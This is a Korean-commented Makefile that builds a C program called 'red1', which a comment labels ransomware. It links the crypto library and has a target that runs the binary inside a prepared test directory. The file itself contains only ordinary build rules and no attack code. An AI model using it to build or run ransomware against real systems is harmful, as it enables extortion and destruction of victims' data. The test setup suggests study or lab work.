# 1. 변수 설정 (Variables)
# --------------------------

# 컴파일러
CC = gcc

# 컴파일 플래그:
# -Wall -Wextra : 거의 모든 표준 경고를 킴 (버그 잡기 좋음)
# -g            : 디버깅 정보를 포함 (gdb 사용 시)
# -Isrc         : 'src' 디렉터리도 헤더 파일 검색 경로에 포함 (옵션)
CFLAGS = -Wall -Wextra -g

# 최종 실행 파일 이름
TARGET = red1

# 링커 플래그: crypto 라이브러리를 링크
LDFLAGS = -lcrypto -pthread

# 2. 자동화 변수 (Automatic Variables)
# -----------------------------------

# 'src' 디렉터리 안의 모든 .c 파일을 자동으로 찾습니다.
# (나중에 src/crypto.c, src/env_check.c를 추가해도 Makefile을 수정할 필요가 없습니다!)
SRCS = $(wildcard src/*.c)

# .c 파일 목록을 .o (오브젝트) 파일 목록으로 변환합니다.
# (예: src/main.c -> obj/main.o)
OBJS = $(patsubst src/%.c, obj/%.o, $(SRCS))

# 3. 빌드 규칙 (Recipes)
# ---------------------

# .PHONY : 'all', 'clean', 'runtest'는 파일 이름이 아니라 '명령의 별명'임을 명시합니다.
.PHONY: all clean runtest

# 'make' 라고만 입력하면 실행되는 기본 규칙 (all)
all: $(TARGET)

# 최종 실행 파일(ransomware)을 만드는 규칙
$(TARGET): $(OBJS)
	@echo "Linking..."
	$(CC) $(CFLAGS) -o $(TARGET) $(OBJS) $(LDFLAGS)
	@echo "Build complete: $(TARGET)"

# 'obj/%.o' (오브젝트 파일)을 'src/%.c' (소스 파일)로부터 만드는 패턴 규칙
obj/%.o: src/%.c
	# .o 파일을 저장할 'obj' 디렉터리가 없으면 생성합니다. (@는 명령어 자체를 숨김)
	@mkdir -p obj
	@echo "Compiling $<..."
	$(CC) $(CFLAGS) -c $< -o $@

# 4. 편의 규칙 (Utility Recipes)
# -----------------------------

# 'make clean' : 빌드 결과물(실행 파일, obj 디렉터리)을 모두 삭제합니다.
clean:
	@echo "Cleaning up..."
	rm -f $(TARGET)
	rm -rf obj

# 'make runtest' : 빌드 후, 테스트 환경을 구축하고 프로그램을 실행합니다.
runtest: all setup_test_env.sh
	@echo "Setting up test environment..."
	@./setup_test_env.sh
	@echo "--- Running test inside 'test_environment' ---"
	@cd test_environment && ../$(TARGET)
	@echo "--- Test run finished ---"
